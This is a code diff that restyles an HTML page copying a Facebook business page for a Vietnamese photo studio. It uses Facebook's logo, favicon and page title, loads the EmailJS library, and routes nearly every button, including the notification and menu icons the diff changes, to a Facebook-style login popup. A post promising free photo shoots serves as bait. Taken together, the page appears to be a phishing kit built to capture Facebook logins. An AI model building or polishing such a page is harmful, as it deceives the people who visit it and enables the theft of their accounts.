@@ -3,9 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Meimei Studio - Studio chụp ảnh chuyên nghiệp tại TP. HCM.">
+    <meta property="og:title" content="Meimei Studio | Facebook">
+    <meta property="og:image" content="https://i.imgur.com/qAdnBSo.jpg">
     <title>Meimei Studio | Facebook</title>
-    <!-- Favicon giống Facebook -->
     <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
     <script>
         (function() {
@@ -21,7 +25,7 @@
         }
         body {
             background-color: #F0F2F5;
-            color: #1c1e21;
+            color: #1C1E21; /* Đồng bộ với Facebook */
         }
         .container {
             width: 100%;
@@ -35,7 +39,7 @@
             align-items: center;
             background-color: #FFFFFF;
             padding: 10px 15px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08); /* Bóng đổ nhẹ */
             height: 56px;
             position: sticky;
             top: 0;
@@ -50,6 +54,10 @@
         .header .icon {
             width: 24px;
             height: 24px;
+            transition: transform 0.2s;
+        }
+        .header .icon:hover {
+            transform: scale(1.2);
         }
         .header .back-section {
             display: flex;
@@ -71,7 +79,7 @@
             border-radius: 20px;
             background: #F0F2F5;
             font-size: 14px;
-            color: #606770;
+            color: #65676B;
         }
         .header .search-bar input::placeholder {
             color: #8A8D91;
@@ -101,12 +109,13 @@
             object-fit: cover;
             display: block;
             background: #E4E6EB;
-            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
         }
         .page-info {
             background-color: #FFFFFF;
             padding: 0 16px 16px;
             text-align: left;
+            border-radius: 10px; /* Bo tròn */
         }
         .page-info .name {
             font-size: 32px;
@@ -133,14 +142,9 @@
             border-bottom: 2px solid #FFFFFF;
             transform: rotate(-45deg);
         }
-        .page-info .stats {
-            color: #606770;
+        .page-info .stats, .page-info .description {
+            color: #65676B; /* Đồng bộ màu phụ */
             font-size: 15px;
-            margin: 4px 0;
-        }
-        .page-info .description {
-            font-size: 15px;
-            color: #606770;
             margin: 4px 0;
         }
         .action-buttons {
@@ -152,32 +156,32 @@
             justify-content: flex-end;
         }
         .action-buttons button {
-            padding: 0 16px; /* Tăng padding giống Facebook */
+            padding: 0 16px;
             border: none;
-            border-radius: 6px;
+            border-radius: 10px; /* Bo tròn hơn */
             font-size: 15px;
             font-weight: 600;
             cursor: pointer;
-            height: 36px; /* Kích thước chuẩn của Facebook */
+            height: 36px;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 6px;
             white-space: nowrap;
-            background: #E4E6EB; /* Màu nút mặc định giống Facebook */
-            color: #050505;
+            background: #E4E6EB;
+            color: #1C1E21;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+            transition: transform 0.2s;
+        }
+        .action-buttons button:hover {
+            transform: translateY(-2px);
         }
         .action-buttons .message {
-            background-color: #1877F2; /* Màu xanh chuẩn Facebook */
+            background: linear-gradient(to bottom, #1877F2, #166FE5); /* Gradient */
             color: #FFFFFF;
         }
-        .action-buttons .message img {
-            width: 20px;
-            height: 20px;
-        }
-        .action-buttons .like img, .action-buttons .share img {
-            width: 20px;
-            height: 20px;
+        .action-buttons .message i, .action-buttons .like i, .action-buttons .share i {
+            font-size: 20px;
         }
         .tabs {
             display: flex;
@@ -194,7 +198,7 @@
         }
         .tabs a {
             text-decoration: none;
-            color: #65676b;
+            color: #65676B;
             font-size: 15px;
             padding: 0 16px 12px;
             font-weight: 600;
@@ -208,39 +212,45 @@
         }
         .tabs a:hover {
             background: #F2F3F5;
-            border-radius: 8px;
+            border-radius: 10px;
         }
         .details {
             background-color: #FFFFFF;
             padding: 16px;
             border-bottom: 1px solid #DADDE1;
-            height: auto;
-            overflow: hidden;
+            border-radius: 10px;
         }
         .details .item {
             display: flex;
             align-items: center;
             margin: 8px 0;
             font-size: 15px;
-            color: #606770;
+            color: #65676B;
         }
-        .details .item .icon {
+        .details .item i {
             margin-right: 12px;
-            width: 20px;
-            height: 20px;
+            font-size: 20px;
+            color: #65676B;
         }
         .details .item strong {
             color: #1C1E21;
         }
-        .album-section {
+        .album-section, .suggestions-section, .reviews-section, .community-section {
             background: #FFFFFF;
             padding: 16px;
-            border-bottom: 1px solid #DADDE1;
+            border-radius: 10px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+            margin-bottom: 12px;
+            transition: transform 0.2s;
         }
-        .album-section p {
+        .album-section:hover, .suggestions-section:hover, .reviews-section:hover, .community-section:hover {
+            transform: translateY(-2px);
+        }
+        .album-section p, .suggestions-section p, .reviews-section p, .community-section p {
             font-size: 16px;
             font-weight: 600;
             margin-bottom: 8px;
+            color: #1C1E21;
         }
         .album-section .album {
             display: grid;
@@ -251,7 +261,7 @@
             width: 100%;
             aspect-ratio: 1;
             object-fit: cover;
-            border-radius: 4px;
+            border-radius: 10px;
             cursor: pointer;
         }
         .album-section .album img:hover {
@@ -274,10 +284,14 @@
         }
         .create-post {
             background: #FFFFFF;
-            border-radius: 8px;
+            border-radius: 10px;
             padding: 12px;
             margin-bottom: 12px;
-            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+            transition: transform 0.2s;
+        }
+        .create-post:hover {
+            transform: translateY(-2px);
         }
         .create-post .input-area {
             display: flex;
@@ -296,175 +310,39 @@
             border-radius: 20px;
             background: #F0F2F5;
             font-size: 15px;
-            color: #050505;
+            color: #1C1E21;
         }
         .create-post .input-area input::placeholder {
-            color: #606770;
+            color: #65676B;
         }
         .create-post .post-button {
             width: 100%;
             padding: 10px;
-            background: #1877F2; /* Màu xanh chuẩn Facebook */
+            background: linear-gradient(to bottom, #1877F2, #166FE5);
             border: none;
-            border-radius: 6px;
+            border-radius: 10px;
             color: #FFFFFF;
             font-size: 15px;
             font-weight: 600;
             cursor: pointer;
             margin-top: 10px;
-            height: 36px; /* Kích thước chuẩn */
+            height: 36px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+            transition: transform 0.2s;
         }
-        .intro-section, .community-section, .suggestions-section, .reviews-section {
-            background: #FFFFFF;
-            border-radius: 8px;
-            padding: 12px;
-            margin-bottom: 12px;
-            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
-        }
-        .community-section p, .suggestions-section p, .reviews-section p {
-            font-size: 16px;
-            font-weight: 600;
-            margin-bottom: 8px;
-        }
-        .community-section .stats {
-            font-size: 14px;
-            color: #606770;
-            margin: 4px 0;
-        }
-        .about-section, .photos-section, .videos-section, .reels-section, .likes-section, .friends-section, .events-section {
-            display: none;
-        }
-        .about-section .item {
-            display: flex;
-            align-items: center;
-            margin: 8px 0;
-            font-size: 15px;
-            color: #050505;
-        }
-        .about-section .item img {
-            width: 20px;
-            height: 20px;
-            margin-right: 12px;
-        }
-        .about-section p {
-            font-size: 15px;
-            color: #050505;
-            margin: 8px 0;
-            line-height: 1.4;
-        }
-        .about-section p strong {
-            font-weight: 600;
-            display: block;
-            margin-bottom: 5px;
-            font-size: 16px;
-        }
-        .videos-section .video-list {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(230px, 1fr));
-            gap: 12px;
-        }
-        .videos-section .video-item {
-            position: relative;
-            background: #F0F2F5;
-            border-radius: 8px;
-            overflow: hidden;
-            cursor: pointer;
-        }
-        .videos-section .video-item img.thumbnail {
-            width: 100%;
-            aspect-ratio: 16/9;
-            object-fit: cover;
-        }
-        .videos-section .video-item .play-icon {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 40px;
-            height: 40px;
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .videos-section .video-item .play-icon::after {
-            content: '';
-            width: 0;
-            height: 0;
-            border-left: 12px solid #FFFFFF;
-            border-top: 8px transparent;
-            border-bottom: 8px transparent;
-        }
-        .videos-section .video-item .video-info {
-            padding: 8px;
-            font-size: 14px;
-            color: #050505;
-        }
-        .videos-section .video-item .video-info .title {
-            font-weight: 600;
-            margin-bottom: 4px;
-            display: -webkit-box;
-            -webkit-line-clamp: 2;
-            -webkit-box-orient: vertical;
-            overflow: hidden;
-        }
-        .videos-section .video-item .video-info .meta {
-            color: #606770;
-            font-size: 12px;
-        }
-        .videos-section .video-item:hover .thumbnail {
-            opacity: 0.9;
-        }
-        .reels-section .video-list {
-            display: flex;
-            gap: 8px;
-            overflow-x: auto;
-            padding: 8px 0;
-        }
-        .reels-section .video-item {
-            position: relative;
-            flex: 0 0 100px;
-            background: #F0F2F5;
-            border-radius: 8px;
-            overflow: hidden;
-            cursor: pointer;
-        }
-        .reels-section .video-item img.thumbnail {
-            width: 100%;
-            aspect-ratio: 9/16;
-            object-fit: cover;
-        }
-        .reels-section .video-item .play-icon {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 24px;
-            height: 24px;
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .reels-section .video-item .play-icon::after {
-            content: '';
-            width: 0;
-            height: 0;
-            border-left: 8px solid #FFFFFF;
-            border-top: 5px transparent;
-            border-bottom: 5px transparent;
-        }
-        .reels-section .video-item .video-info {
-            display: none;
+        .create-post .post-button:hover {
+            transform: translateY(-2px);
         }
         .post {
             background: #FFFFFF;
-            border-radius: 8px;
+            border-radius: 10px;
             padding: 12px;
             margin-bottom: 12px;
-            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+            transition: transform 0.2s;
+        }
+        .post:hover {
+            transform: translateY(-2px);
         }
         .post.pinned {
             border: 2px solid #1877F2;
@@ -496,7 +374,7 @@
         .post-header .info .name {
             font-weight: 600;
             font-size: 13px;
-            color: #050505;
+            color: #1C1E21;
             margin-bottom: 2px;
             display: flex;
             align-items: center;
@@ -535,7 +413,7 @@
         .post .post-content {
             font-size: 15px;
             font-weight: 600;
-            color: #050505;
+            color: #1C1E21;
             margin-bottom: 8px;
             display: -webkit-box;
             -webkit-line-clamp: 2;
@@ -545,7 +423,7 @@
         }
         .post p {
             font-size: 14px;
-            color: #050505;
+            color: #1C1E21;
             margin-bottom: 8px;
             line-height: 1.4;
         }
@@ -558,7 +436,7 @@
         }
         .post .image-gallery img {
             width: 100%;
-            border-radius: 4px;
+            border-radius: 10px;
             object-fit: cover;
             aspect-ratio: 1;
         }
@@ -575,7 +453,7 @@
             color: #FFFFFF;
             background: rgba(0, 0, 0, 0.5);
             padding: 10px;
-            border-radius: 4px;
+            border-radius: 10px;
         }
         .like-info {
             display: flex;
@@ -586,11 +464,6 @@
             flex-wrap: wrap;
         }
         .like-info img {
-            width: 16px;
-            height: 16px;
-            margin-right: 4px;
-        }
-        .like-info .avatar {
             width: 16px;
             height: 16px;
             border-radius: 50%;
@@ -608,8 +481,8 @@
         .actions .action {
             cursor: pointer;
             padding: 8px;
-            border-radius: 4px;
-            transition: background 0.2s;
+            border-radius: 10px;
+            transition: background 0.2s, transform 0.2s;
             display: flex;
             align-items: center;
             gap: 6px;
@@ -618,14 +491,19 @@
         }
         .actions .action:hover {
             background: #F5F6F5;
+            transform: translateY(-2px);
         }
-        .actions .action img {
-            width: 20px;
-            height: 20px;
+        .actions .action i {
+            font-size: 20px;
+            transition: transform 0.2s;
+        }
+        .actions .action:hover i {
+            transform: scale(1.2);
+            color: #1877F2;
         }
         .comments {
             font-size: 13px;
-            color: #050505;
+            color: #1C1E21;
             margin-top: 8px;
             padding-top: 8px;
             border-top: 1px solid #CED0D4;
@@ -637,49 +515,59 @@
             align-items: center;
             margin-bottom: 5px;
         }
-        .comments .comment-item img.avatar {
+        .comments .comment-item img {
             width: 16px;
             height: 16px;
             border-radius: 50%;
             margin-right: 8px;
         }
-        .likes-section .like-item {
+        .suggestions-section .suggestion-item, .reviews-section .review-item, .likes-section .like-item, .friends-section .friend-item {
             display: flex;
             align-items: center;
             margin: 8px 0;
             font-size: 14px;
-            color: #050505;
+            color: #1C1E21;
         }
-        .likes-section .like-item img.avatar {
+        .suggestion-item img, .review-item img, .like-item img, .friend-item img {
             width: 32px;
             height: 32px;
             border-radius: 50%;
             margin-right: 8px;
         }
-        .friends-section .friend-item {
-            display: flex;
-            align-items: center;
-            margin: 8px 0;
-            font-size: 14px;
-            color: #050505;
+        .reviews-section .rating {
+            font-size: 15px;
+            color: #1C1E21;
+            margin-bottom: 8px;
         }
-        .friends-section .friend-item img.avatar {
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            margin-right: 8px;
+        .reviews-section .rating span:nth-child(2) {
+            color: #65676B;
+            font-size: 13px;
+            margin-left: 8px;
+        }
+        .see-all {
+            padding: 8px 16px;
+            background: #E4E6EB;
+            border: none;
+            border-radius: 10px;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: transform 0.2s;
+        }
+        .see-all:hover {
+            transform: translateY(-2px);
         }
         .events-section .event-item {
             display: flex;
             align-items: center;
             margin: 8px 0;
             font-size: 14px;
-            color: #050505;
+            color: #1C1E21;
         }
         .events-section .event-item img {
             width: 32px;
             height: 32px;
-            border-radius: 4px;
+            border-radius: 10px;
             margin-right: 8px;
         }
         .overlay {
@@ -700,12 +588,35 @@
             transform: translate(-50%, -50%);
             background: #fff;
             padding: 16px;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            border-radius: 12px; /* Bo tròn hơn */
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1); /* Bóng đổ mềm */
             text-align: center;
             z-index: 1001;
             max-width: 320px;
             width: 90%;
+            animation: fadeIn 0.3s ease-in;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translate(-50%, -60%); }
+            to { opacity: 1; transform: translate(-50%, -50%); }
+        }
+        .popup.success::before {
+            content: '\f00c';
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
+            color: #42B72A;
+            font-size: 24px;
+            display: block;
+            margin-bottom: 10px;
+        }
+        .popup.error::before {
+            content: '\f00d';
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
+            color: #FF0000;
+            font-size: 24px;
+            display: block;
+            margin-bottom: 10px;
         }
         .popup input {
             width: 100%;
@@ -724,21 +635,21 @@
         .popup .btn-login {
             width: 100%;
             padding: 12px;
-            background: #1877f2;
+            background: linear-gradient(to bottom, #1877F2, #166FE5);
             border: none;
-            border-radius: 6px;
+            border-radius: 10px;
             color: #fff;
             font-size: 17px;
             font-weight: bold;
             cursor: pointer;
-            transition: background 0.2s;
+            transition: transform 0.2s;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 8px;
         }
         .popup .btn-login:hover {
-            background: #166fe5;
+            transform: translateY(-2px);
         }
         .popup .forgot-password {
             color: #1877f2;
@@ -757,17 +668,17 @@
         }
         .popup .btn-create {
             padding: 12px 16px;
-            background: #42b72a;
+            background: linear-gradient(to bottom, #42B72A, #36A420);
             border: none;
-            border-radius: 6px;
+            border-radius: 10px;
             color: #fff;
             font-size: 15px;
             font-weight: bold;
             cursor: pointer;
-            transition: background 0.2s;
+            transition: transform 0.2s;
         }
         .popup .btn-create:hover {
-            background: #36a420;
+            transform: translateY(-2px);
         }
         .popup .error-message {
             color: #ff0000;
@@ -775,74 +686,139 @@
             margin-top: 8px;
             display: none;
         }
-        .suggestions-section p {
-            font-size: 16px;
-            font-weight: 600;
-            margin-bottom: 8px;
+        .about-section, .photos-section, .videos-section, .reels-section, .likes-section, .friends-section, .events-section {
+            display: none;
         }
-        .suggestion-item {
+        .about-section .item {
             display: flex;
             align-items: center;
             margin: 8px 0;
-            font-size: 14px;
-            color: #050505;
-        }
-        .suggestion-item .avatar {
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            margin-right: 8px;
-        }
-        .reviews-section {
-            background: #FFFFFF;
-            border-radius: 8px;
-            padding: 12px;
-            margin-bottom: 12px;
-            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
-        }
-        .reviews-section p {
-            font-size: 16px;
-            font-weight: 600;
-            margin-bottom: 8px;
-        }
-        .rating {
             font-size: 15px;
-            color: #050505;
-            margin-bottom: 8px;
+            color: #1C1E21;
         }
-        .rating span:nth-child(2) {
-            color: #606770;
-            font-size: 13px;
-            margin-left: 8px;
+        .about-section .item i {
+            font-size: 20px;
+            margin-right: 12px;
+            color: #65676B;
         }
-        .review-item {
-            display: flex;
+        .about-section p {
+            font-size: 15px;
+            color: #1C1E21;
             margin: 8px 0;
-            font-size: 14px;
-            color: #050505;
+            line-height: 1.4;
         }
-        .review-item .avatar {
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            margin-right: 8px;
+        .about-section p strong {
+            font-weight: 600;
+            display: block;
+            margin-bottom: 5px;
+            font-size: 16px;
         }
-        .review-item div {
-            flex: 1;
+        .videos-section .video-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(230px, 1fr));
+            gap: 12px;
         }
-        .review-item p {
-            font-size: 13px;
-            color: #606770;
-            margin-top: 4px;
-        }
-        .see-all {
-            padding: 8px 16px;
-            background: #E4E6EB;
-            border: none;
-            border-radius: 6px;
-            font-size: 14px;
+        .videos-section .video-item {
+            position: relative;
+            background: #F0F2F5;
+            border-radius: 10px;
+            overflow: hidden;
             cursor: pointer;
-            margin-top: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+        }
+        .videos-section .video-item img.thumbnail {
+            width: 100%;
+            aspect-ratio: 16/9;
+            object-fit: cover;
+        }
+        .videos-section .video-item .play-icon {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 40px;
+            height: 40px;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .videos-section .video-item .play-icon::after {
+            content: '';
+            width: 0;
+            height: 0;
+            border-left: 12px solid #FFFFFF;
+            border-top: 8px transparent;
+            border-bottom: 8px transparent;
+        }
+        .videos-section .video-item .video-info {
+            padding: 8px;
+            font-size: 14px;
+            color: #1C1E21;
+        }
+        .videos-section .video-item .video-info .title {
+            font-weight: 600;
+            margin-bottom: 4px;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+        }
+        .videos-section .video-item .video-info .meta {
+            color: #65676B;
+            font-size: 12px;
+        }
+        .videos-section .video-item:hover .thumbnail {
+            opacity: 0.9;
+        }
+        .reels-section .video-list {
+            display: flex;
+            gap: 8px;
+            overflow-x: auto;
+            padding: 8px 0;
+        }
+        .reels-section .video-item {
+            position: relative;
+            flex: 0 0 100px;
+            background: #F0F2F5;
+            border-radius: 10px;
+            overflow: hidden;
+            cursor: pointer;
+        }
+        .reels-section .video-item img.thumbnail {
+            width: 100%;
+            aspect-ratio: 9/16;
+            object-fit: cover;
+        }
+        .reels-section .video-item .play-icon {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 24px;
+            height: 24px;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .reels-section .video-item .play-icon::after {
+            content: '';
+            width: 0;
+            height: 0;
+            border-left: 8px solid #FFFFFF;
+            border-top: 5px transparent;
+            border-bottom: 5px transparent;
+        }
+        .reels-section .video-item .video-info {
+            display: none;
+        }
+        .community-section .stats {
+            font-size: 14px;
+            color: #65676B;
+            margin: 4px 0;
         }
         .about-subsection {
             margin-bottom: 16px;
@@ -914,7 +890,6 @@
         <!-- Header -->
         <div class="header">
             <div class="back-section">
-                <!-- Logo Facebook -->
                 <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook Logo" class="icon" loading="lazy">
                 <span>Meimei Studio</span>
             </div>
@@ -923,8 +898,8 @@
             </div>
             <div class="title">Meimei Studio</div>
             <div>
-                <img src="https://imgur.com/pCHb488.jpg" alt="Notifications" class="icon" onclick="showLoginPopup()" loading="lazy">
-                <img src="https://imgur.com/hCCEW3P.jpg" alt="Menu" class="icon" loading="lazy">
+                <i class="fas fa-bell icon" onclick="showLoginPopup()"></i>
+                <i class="fas fa-bars icon" onclick="showLoginPopup()"></i>
             </div>
         </div>
 
@@ -950,13 +925,13 @@
         <!-- Action Buttons -->
         <div class="action-buttons">
             <button class="like" onclick="showLoginPopup()">
-                Thích
+                <i class="fas fa-thumbs-up"></i> Thích
             </button>
             <button class="message" onclick="showLoginPopup()">
-                Nhắn tin
+                <i class="fas fa-comment"></i> Nhắn tin
             </button>
             <button class="share" onclick="showLoginPopup()">
-                Chia sẻ
+                <i class="fas fa-share"></i> Chia sẻ
             </button>
         </div>
 
@@ -975,27 +950,27 @@
         <!-- Details -->
         <div class="details">
             <div class="item">
-                <img src="https://imgur.com/x7s5fHO.jpg" alt="Page" class="icon" loading="lazy">
+                <i class="fas fa-camera"></i>
                 <span><strong>Trang</strong> • Studio chụp ảnh</span>
             </div>
             <div class="item">
-                <img src="https://imgur.com/UI5roIM.jpg" alt="Location" class="icon" loading="lazy">
+                <i class="fas fa-map-marker-alt"></i>
                 <span><strong>424 Nguyễn Trãi, 286/1B Trần Hưng Đạo, P. Nguyễn Cư Trinh, Q1, Hồ Chí Minh</strong></span>
             </div>
             <div class="item">
-                <img src="https://imgur.com/70ptpsF.jpg" alt="Email" class="icon" loading="lazy">
+                <i class="fas fa-envelope"></i>
                 <span><strong>contact@meimeistudio.vn</strong></span>
             </div>
             <div class="item">
-                <img src="https://imgur.com/f4Jyh5V.jpg" alt="Website" class="icon" loading="lazy">
+                <i class="fas fa-globe"></i>
                 <span><strong><a href="https://www.tiktok.com/@meimeimodel_vision">tiktok.com/@meimeimodel_vision</a></strong></span>
             </div>
             <div class="item">
-                <img src="https://imgur.com/1iXfcdp.jpg" alt="Hours" class="icon" loading="lazy">
+                <i class="fas fa-clock"></i>
                 <span><strong>Mở cửa: 9:00 - 21:00</strong></span>
             </div>
             <div class="item">
-                <img src="https://imgur.com/hZMlNQJ.jpg" alt="Social" class="icon" loading="lazy">
+                <i class="fab fa-instagram"></i>
                 <span><strong><a href="https://instagram.com/meimeistudio">instagram.com/meimeistudio</a></strong></span>
             </div>
         </div>
@@ -1018,11 +993,11 @@
                 <div class="suggestions-section">
                     <p>Đề xuất</p>
                     <div class="suggestion-item">
-                        <img src="https://i.imgur.com/oy1XxUp.jpg" alt="Studio A" class="avatar" loading="lazy">
+                        <img src="https://i.imgur.com/oy1XxUp.jpg" alt="Studio A" loading="lazy">
                         <span><a href="#">Studio A</a></span>
                     </div>
                     <div class="suggestion-item">
-                        <img src="https://i.imgur.com/YFwhhDb.jpg" alt="Studio B" class="avatar" loading="lazy">
+                        <img src="https://i.imgur.com/YFwhhDb.jpg" alt="Studio B" loading="lazy">
                         <span><a href="#">Studio B</a></span>
                     </div>
                     <button class="see-all" onclick="alert('Xem tất cả đề xuất')">Xem tất cả</button>
@@ -1034,14 +1009,14 @@
                         <span>(120 đánh giá)</span>
                     </div>
                     <div class="review-item">
-                        <img src="https://i.imgur.com/GT3OXZP.jpg" alt="Lan Anh" class="avatar" loading="lazy">
+                        <img src="https://i.imgur.com/GT3OXZP.jpg" alt="Lan Anh" loading="lazy">
                         <div>
                             <span><strong>Lan Anh</strong></span>
                             <p>Chụp ảnh rất đẹp, chuyên nghiệp!</p>
                         </div>
                     </div>
                     <div class="review-item">
-                        <img src="https://i.imgur.com/7eRH4Fr.jpg" alt="Ngọc Mai" class="avatar" loading="lazy">
+                        <img src="https://i.imgur.com/7eRH4Fr.jpg" alt="Ngọc Mai" loading="lazy">
                         <div>
                             <span><strong>Ngọc Mai</strong></span>
                             <p>Nhân viên thân thiện, sẽ quay lại!</p>
@@ -1058,7 +1033,7 @@
             </div>
             <div class="posts">
                 <div id="posts-tab" class="tab-content active">
-                    <!-- Khung Tạo Bài Viết -->
+                    <!-- Create Post -->
                     <div class="create-post">
                         <div class="input-area">
                             <img src="https://i.imgur.com/qAdnBSo.jpg" alt="Profile Pic" loading="lazy">
@@ -1067,7 +1042,7 @@
                         <button class="post-button" onclick="showLoginPopup()">Đăng</button>
                     </div>
 
-                    <!-- Bài viết nổi bật -->
+                    <!-- Pinned Post -->
                     <div class="post pinned">
                         <div class="post-header">
                             <img src="https://i.imgur.com/qAdnBSo.jpg" alt="Profile Pic" loading="lazy">
@@ -1085,24 +1060,24 @@
                             <img src="https://imgur.com/Yua11LC.jpg" alt="Welcome 2" loading="lazy">
                         </div>
                         <div class="like-info">
-                            <img src="https://i.imgur.com/oy1XxUp.jpg" class="avatar" alt="Lan Anh" loading="lazy">
-                            <img src="https://i.imgur.com/YFwhhDb.jpg" class="avatar" alt="Ngọc Mai" loading="lazy">
+                            <img src="https://i.imgur.com/oy1XxUp.jpg" alt="Lan Anh" loading="lazy">
+                            <img src="https://i.imgur.com/YFwhhDb.jpg" alt="Ngọc Mai" loading="lazy">
                             <span>Lan Anh, Ngọc Mai và 12k người khác</span>
                         </div>
                         <div class="actions">
                             <div class="action like" onclick="showLoginPopup()">
-                                <img src="https://imgur.com/Y2gdw8r.jpg" alt="Like" loading="lazy"> Thích <span>12k</span>
+                                <i class="fas fa-thumbs-up"></i> Thích <span>12k</span>
                             </div>
                             <div class="action comment" onclick="showLoginPopup()">
-                                <img src="https://imgur.com/pCHb488.jpg" alt="Comment" loading="lazy"> Bình luận <span>1.5k</span>
+                                <i class="fas fa-comment"></i> Bình luận <span>1.5k</span>
                             </div>
                             <div class="action share" onclick="showLoginPopup()">
-                                <img src="https://imgur.com/ncN22Za.jpg" alt="Share" loading="lazy"> Chia sẻ <span>2k</span>
+                                <i class="fas fa-share"></i> Chia sẻ <span>2k</span>
                             </div>
                         </div>
                     </div>
 
-                    <!-- Bài viết 1 -->
+                    <!-- Post 1 -->
                     <div class="post">
                         <div class="post-header">
                             <img src="https://i.imgur.com/qAdnBSo.jpg" alt="Profile Pic" loading="lazy">
@@ -1124,35 +1099,35 @@
                             </div>
                         </div>
                         <div class="like-info">
-                            <img src="https://i.imgur.com/oy1XxUp.jpg" class="avatar" alt="Lan Anh" loading="lazy">
-                            <img src="https://i.imgur.com/YFwhhDb.jpg" class="avatar" alt="Ngọc Mai" loading="lazy">
-                            <img src="https://i.imgur.com/GT3OXZP.jpg" class="avatar" alt="Minh Tuấn" loading="lazy">
+                            <img src="https://i.imgur.com/oy1XxUp.jpg" alt="Lan Anh" loading="lazy">
+                            <img src="https://i.imgur.com/YFwhhDb.jpg" alt="Ngọc Mai" loading="lazy">
+                            <img src="https://i.imgur.com/GT3OXZP.jpg" alt="Minh Tuấn" loading="lazy">
                             <span>Lan Anh, Ngọc Mai, Minh Tuấn và 9.8k người khác</span>
                         </div>
                         <div class="actions">
                             <div class="action like" onclick="showLoginPopup()">
-                                <img src="https://imgur.com/Y2gdw8r.jpg" alt="Like" loading="lazy"> Thích <span>9.8k</span>
+                                <i class="fas fa-thumbs-up"></i> Thích <span>9.8k</span>
                             </div>
                             <div class="action comment" onclick="showLoginPopup()">
-                                <img src="https://imgur.com/pCHb488.jpg" alt="Comment" loading="lazy"> Bình luận <span>692</span>
+                                <i class="fas fa-comment"></i> Bình luận <span>692</span>
                             </div>
                             <div class="action share" onclick="showLoginPopup()">
-                                <img src="https://imgur.com/ncN22Za.jpg" alt="Share" loading="lazy"> Chia sẻ <span>827</span>
+                                <i class="fas fa-share"></i> Chia sẻ <span>827</span>
                             </div>
                         </div>
                         <div class="comments">
                             <div class="comment-item">
-                                <img src="https://i.imgur.com/oy1XxUp.jpg" class="avatar" alt="Lan Anh" loading="lazy">
+                                <img src="https://i.imgur.com/oy1XxUp.jpg" alt="Lan Anh" loading="lazy">
                                 <p><strong>Lan Anh:</strong> Mẫu này xinh quá Meimei ơi!</p>
                             </div>
                             <div class="comment-item">
-                                <img src="https://i.imgur.com/YFwhhDb.jpg" class="avatar" alt="Ngọc Mai" loading="lazy">
+                                <img src="https://i.imgur.com/YFwhhDb.jpg" alt="Ngọc Mai" loading="lazy">
                                 <p><strong>Ngọc Mai:</strong> IB ngay đây, shop rep sớm nha 😍</p>
                             </div>
                         </div>
                     </div>
 
-                    <!-- Bài viết 2 -->
+                    <!-- Post 2 -->
                     <div class="post">
                         <div class="post-header">
                             <img src="https://i.imgur.com/qAdnBSo.jpg" alt="Profile Pic" loading="lazy">
@@ -1164,7 +1139,7 @@
                             </div>
                         </div>
                         <div class="post-content">Tìm mẫu chụp ảnh sản phẩm mới!</div>
-                        <p> Mẫu nhà MeiMei nè xinh xỉu luôn nha mấy chế ơi , ib em làm một bộ nhé 😍 không tốn tiền mà còn được ảnh video làm kỉ niệm nha mấy bà ♥️ !</p>
+                        <p>Mẫu nhà MeiMei nè xinh xỉu luôn nha mấy chế ơi, ib em làm một bộ nhé 😍 không tốn tiền mà còn được ảnh video làm kỉ niệm nha mấy bà ♥️!</p>
                         <div class="image-gallery">
                             <img src="https://imgur.com/GDGSiBJ.jpg" alt="Lookbook 1" loading="lazy">
                             <img src="https://imgur.com/kMfbbEG.jpg" alt="Lookbook 2" loading="lazy">
@@ -1174,35 +1149,35 @@
